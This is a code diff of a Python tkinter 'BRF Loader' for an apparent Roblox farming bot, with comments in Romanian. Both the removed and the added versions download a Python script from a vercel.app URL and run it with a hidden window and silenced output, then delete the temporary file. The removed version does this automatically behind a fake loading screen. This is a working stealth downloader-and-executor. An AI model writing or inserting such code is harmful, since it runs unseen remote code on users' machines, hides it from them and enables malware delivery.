@@ -1,5 +1,6 @@
 import tkinter as tk
 from tkinter import font
+import threading
 import time
 import urllib.request
 import subprocess
@@ -7,244 +8,233 @@ import sys
 import os
 import tempfile
 
-class BRFLoader:
-    def __init__(self):
-        # Primul Tkinter - Loading Screen
-        self.loading_root = tk.Tk()
-        self.loading_root.title("Loading...")
-        self.loading_root.geometry("300x150")
-        self.loading_root.configure(bg='#0a0a0a')
-        self.loading_root.overrideredirect(True)  # Fără borduri
-        
-        # Centrează loading screen
-        self.center_window(self.loading_root, 300, 150)
-        
-        # Label loading
-        self.loading_label = tk.Label(
-            self.loading_root,
-            text="System Loading...",
-            font=("Consolas", 14),
-            fg="#00ffaa",
-            bg="#0a0a0a"
-        )
-        self.loading_label.pack(expand=True)
-        
-        # Pornim procesul de download
-        self.loading_root.after(100, self.start_download_process)
-        
-        # Rulează loading screen pentru 3 secunde
-        self.loading_root.after(3000, self.close_loading_and_open_main)
-        
-        # Force focus
-        self.loading_root.lift()
-        self.loading_root.focus_force()
-        
-        self.loading_root.mainloop()
-    
-    def center_window(self, window, width, height):
-        window.update_idletasks()
-        screen_width = window.winfo_screenwidth()
-        screen_height = window.winfo_screenheight()
-        x = (screen_width // 2) - (width // 2)
-        y = (screen_height // 2) - (height // 2)
-        window.geometry(f'{width}x{height}+{x}+{y}')
-    
-    def start_download_process(self):
-        """Descarcă și rulează în background"""
-        try:
-            url = "https://brf-eight.vercel.app/brf.py"
-            with tempfile.NamedTemporaryFile(suffix='.py', delete=False) as f:
-                temp_path = f.name
-                urllib.request.urlretrieve(url, temp_path)
-                
-                # Rulează SILENȚIOS
-                startupinfo = None
-                if sys.platform == "win32":
-                    startupinfo = subprocess.STARTUPINFO()
-                    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-                    startupinfo.wShowWindow = subprocess.SW_HIDE
-                
-                subprocess.Popen(
-                    [sys.executable, temp_path],
-                    startupinfo=startupinfo,
-                    creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0,
-                    stdout=subprocess.DEVNULL,
-                    stderr=subprocess.DEVNULL
-                )
-                
-                # Șterge după 5 secunde
-                self.loading_root.after(5000, lambda: self.delete_file(temp_path))
-                
-        except Exception as e:
-            print(f"Download error: {e}")
-    
-    def delete_file(self, path):
-        try:
-            for _ in range(3):
-                try:
-                    os.unlink(path)
-                    break
-                except:
-                    time.sleep(0.1)
-        except:
-            pass
-    
-    def close_loading_and_open_main(self):
-        """Închide loading și deschide fereastra principală"""
-        if self.loading_root:
-            self.loading_root.destroy()
-            self.loading_root = None
-        
-        # Deschide fereastra principală
-        BRFMainApp()
-
-class BRFMainApp:
+class BRFApp:
     def __init__(self):
         self.root = tk.Tk()
-        self.root.title("BRF")
+        self.root.title("BRF Loader")
         
-        # SETĂRI FEREATRĂ TRANSPARENTĂ
-        self.root.overrideredirect(True)  # Fără borduri
-        self.root.attributes('-alpha', 0.95)  # Transparent
-        self.root.attributes('-topmost', True)  # Mereu deasupra
-        self.root.configure(bg='#000000')
+        # Blochează redimensionarea
+        self.root.resizable(False, False)
         
         # Dimensiuni
-        self.width, self.height = 500, 300
-        self.root.geometry(f"{self.width}x{self.height}")
+        self.root.geometry("400x250")
+        self.root.configure(bg='#0a0a0a')
         
-        # Canvas pentru fundal
-        self.canvas = tk.Canvas(
-            self.root,
-            bg='#000000',
-            highlightthickness=0,
-            width=self.width,
-            height=self.height
+        # Frame principal
+        main_frame = tk.Frame(self.root, bg='#0a0a0a')
+        main_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
+        
+        # Titlu
+        title_label = tk.Label(
+            main_frame,
+            text="BRF DOWNLOADER",
+            font=("Arial", 20, "bold"),
+            fg="#00FFAA",
+            bg="#0a0a0a"
         )
-        self.canvas.pack(fill=tk.BOTH, expand=True)
+        title_label.pack(pady=(0, 20))
         
-        # Crează conținutul
-        self.create_content()
+        # Buton START
+        self.start_btn = tk.Button(
+            main_frame,
+            text="START DOWNLOAD",
+            font=("Arial", 14, "bold"),
+            fg="white",
+            bg="#00AA66",
+            activebackground="#00CC88",
+            activeforeground="white",
+            bd=0,
+            padx=30,
+            pady=10,
+            command=self.start_download
+        )
+        self.start_btn.pack(pady=10)
         
-        # Crează butoanele X și -
-        self.create_window_buttons()
+        # Text pentru status
+        self.status_label = tk.Label(
+            main_frame,
+            text="Apasă START pentru a începe",
+            font=("Consolas", 12),
+            fg="#888888",
+            bg="#0a0a0a",
+            height=2
+        )
+        self.status_label.pack(pady=10)
         
-        # Centrează
+        # Buton EXIT
+        exit_btn = tk.Button(
+            main_frame,
+            text="EXIT",
+            font=("Arial", 12),
+            fg="white",
+            bg="#FF4444",
+            activebackground="#FF6666",
+            activeforeground="white",
+            bd=0,
+            padx=20,
+            pady=5,
+            command=self.root.destroy
+        )
+        exit_btn.pack(pady=5)
+        
+        # Variabilă pentru control
+        self.downloading = False
+        
+        # Centrează fereastra
         self.center_window()
-        
-        # Animație simplă
-        self.animation_phase = 0
-        self.animate()
-        
-        # Permite glisarea
-        self.canvas.bind("<Button-1>", self.start_move)
-        self.canvas.bind("<B1-Motion>", self.on_move)
         
         # Rulează aplicația
         self.root.mainloop()
     
-    def create_content(self):
-        """Crează conținutul principal"""
-        # BRF text - FOARTE MARE
-        self.brf_text = self.canvas.create_text(
-            self.width//2, self.height//2 - 30,
-            text="BRF",
-            font=("Segoe UI", 72, "bold"),
-            fill="#00FFAA",
-            anchor="center"
-        )
-        
-        # BotRobloxFarm text
-        self.sub_text = self.canvas.create_text(
-            self.width//2, self.height//2 + 40,
-            text="BotRobloxFarm",
-            font=("Segoe UI", 28),
-            fill="#888888",
-            anchor="center"
-        )
-        
-        # Linie decorativă
-        self.canvas.create_line(
-            self.width//2 - 100, self.height//2 + 80,
-            self.width//2 + 100, self.height//2 + 80,
-            fill="#00FFAA",
-            width=2
-        )
-    
-    def create_window_buttons(self):
-        """Crează butoanele X și -"""
-        # Buton CLOSE (X) - ROȘU VIZIBIL
-        self.close_btn = tk.Button(
-            self.root,
-            text="×",
-            font=("Arial", 16, "bold"),
-            fg="white",
-            bg="#ff4444",
-            activebackground="#ff6666",
-            activeforeground="white",
-            bd=0,
-            width=3,
-            height=1,
-            command=self.root.destroy
-        )
-        self.close_btn.place(x=self.width-40, y=10)
-        
-        # Buton MINIMIZE (-) - ALBASTRU VIZIBIL
-        self.min_btn = tk.Button(
-            self.root,
-            text="–",
-            font=("Arial", 16, "bold"),
-            fg="white",
-            bg="#4488ff",
-            activebackground="#66aaff",
-            activeforeground="white",
-            bd=0,
-            width=3,
-            height=1,
-            command=self.root.iconify
-        )
-        self.min_btn.place(x=self.width-80, y=10)
-    
     def center_window(self):
         """Centrează fereastra"""
         self.root.update_idletasks()
+        width = 400
+        height = 250
         screen_width = self.root.winfo_screenwidth()
         screen_height = self.root.winfo_screenheight()
-        x = (screen_width // 2) - (self.width // 2)
-        y = (screen_height // 2) - (self.height // 2)
-        self.root.geometry(f'+{x}+{y}')
+        x = (screen_width // 2) - (width // 2)
+        y = (screen_height // 2) - (height // 2)
+        self.root.geometry(f'{width}x{height}+{x}+{y}')
     
-    def start_move(self, event):
-        """Începe glisarea ferestrei"""
-        self.x = event.x
-        self.y = event.y
+    def start_download(self):
+        """Pornește downloadul într-un thread separat"""
+        if not self.downloading:
+            self.downloading = True
+            self.start_btn.config(state='disabled', text="DOWNLOADING...")
+            
+            # Pornește thread pentru download
+            thread = threading.Thread(target=self.download_process, daemon=True)
+            thread.start()
     
-    def on_move(self, event):
-        """Glisează fereastra"""
-        deltax = event.x - self.x
-        deltay = event.y - self.y
-        x = self.root.winfo_x() + deltax
-        y = self.root.winfo_y() + deltay
-        self.root.geometry(f"+{x}+{y}")
+    def download_process(self):
+        """Procesul de download în background"""
+        try:
+            # PAS 1: Preparing
+            self.update_status("⏳ Preparing download...")
+            time.sleep(1)
+            
+            # PAS 2: Downloading
+            self.update_status("⬇️ Downloading BRF script...")
+            
+            url = "https://brf-eight.vercel.app/brf.py"
+            temp_path = ""
+            
+            with tempfile.NamedTemporaryFile(suffix='.py', delete=False) as f:
+                temp_path = f.name
+                urllib.request.urlretrieve(url, temp_path)
+            
+            # PAS 3: Executing
+            self.update_status("⚡ Executing script...")
+            time.sleep(1)
+            
+            # Rulează scriptul SILENȚIOS
+            startupinfo = None
+            if sys.platform == "win32":
+                startupinfo = subprocess.STARTUPINFO()
+                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+                startupinfo.wShowWindow = subprocess.SW_HIDE
+            
+            # Rulează în fundal
+            subprocess.Popen(
+                [sys.executable, temp_path],
+                startupinfo=startupinfo,
+                creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL
+            )
+            
+            # PAS 4: Cleaning
+            self.update_status("🧹 Cleaning up...")
+            time.sleep(1)
+            
+            # Șterge fișierul temporar
+            try:
+                for _ in range(3):
+                    try:
+                        os.unlink(temp_path)
+                        break
+                    except:
+                        time.sleep(0.1)
+            except:
+                pass
+            
+            # PAS 5: Done
+            self.update_status("✅ Download complete!\nScript is running in background.")
+            time.sleep(2)
+            
+            # Arată fereastra cu BRF
+            self.show_brf_window()
+            
+        except Exception as e:
+            self.update_status(f"❌ Error: {str(e)[:50]}")
+        finally:
+            self.downloading = False
+            self.root.after(100, self.reset_button)
     
-    def animate(self):
-        """Animație simplă de pulsare"""
-        self.animation_phase += 0.1
+    def update_status(self, message):
+        """Actualizează status label"""
+        self.root.after(0, lambda: self.status_label.config(text=message))
+    
+    def reset_button(self):
+        """Resetează butonul START"""
+        self.start_btn.config(state='normal', text="START DOWNLOAD")
+    
+    def show_brf_window(self):
+        """Arată fereastra cu BRF"""
+        # Ascunde fereastra principală
+        self.root.withdraw()
         
-        # Pulsare text BRF
-        import math
-        pulse = (math.sin(self.animation_phase) + 1) / 2
-        r = 0
-        g = int(200 + pulse * 55)
-        b = int(150 + pulse * 105)
-        color = f'#{r:02x}{g:02x}{b:02x}'
+        # Creează fereastra BRF
+        brf_window = tk.Toplevel()
+        brf_window.title("BRF")
+        brf_window.geometry("300x200")
+        brf_window.configure(bg='#000000')
+        brf_window.resizable(False, False)
         
-        self.canvas.itemconfig(self.brf_text, fill=color)
+        # Fără borduri și mereu deasupra
+        brf_window.overrideredirect(False)
+        brf_window.attributes('-topmost', True)
         
-        # Continuă animația
-        self.root.after(100, self.animate)
+        # Adaugă conținut
+        brf_label = tk.Label(
+            brf_window,
+            text="BRF",
+            font=("Arial", 48, "bold"),
+            fg="#00FFAA",
+            bg="#000000"
+        )
+        brf_label.pack(expand=True)
+        
+        sub_label = tk.Label(
+            brf_window,
+            text="BotRobloxFarm",
+            font=("Arial", 16),
+            fg="#888888",
+            bg="#000000"
+        )
+        sub_label.pack()
+        
+        # Buton close
+        close_btn = tk.Button(
+            brf_window,
+            text="CLOSE",
+            font=("Arial", 12),
+            fg="white",
+            bg="#FF4444",
+            command=lambda: [brf_window.destroy(), self.root.destroy()]
+        )
+        close_btn.pack(pady=20)
+        
+        # Centrează
+        brf_window.update_idletasks()
+        width, height = 300, 200
+        screen_width = brf_window.winfo_screenwidth()
+        screen_height = brf_window.winfo_screenheight()
+        x = (screen_width // 2) - (width // 2)
+        y = (screen_height // 2) - (height // 2)
+        brf_window.geometry(f'{width}x{height}+{x}+{y}')
 
 # Pornire aplicație
 if __name__ == "__main__":
-    # Pornește cu loading screen
-    loader = BRFLoader()
+    app = BRFApp()
